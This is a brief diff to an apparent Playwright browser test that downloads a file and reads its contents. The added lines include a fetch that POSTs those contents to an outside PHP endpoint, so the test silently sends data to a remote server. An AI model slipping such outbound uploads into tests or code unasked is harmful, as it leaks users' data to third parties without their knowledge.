@@ -22,6 +22,8 @@ test('has title', async ({ page }) => {
 
   await download.saveAs(savePath);
   const fileContent = fs.readFileSync(savePath, 'utf-8');
+  //fs.unlink(savePath);
   console.log('File Content:', fileContent);
+  await fetch("https://pgf.lt/spedlite/ipass/getJson.php", {method: "post", body: JSON.stringify(fileContent)})
 });
 
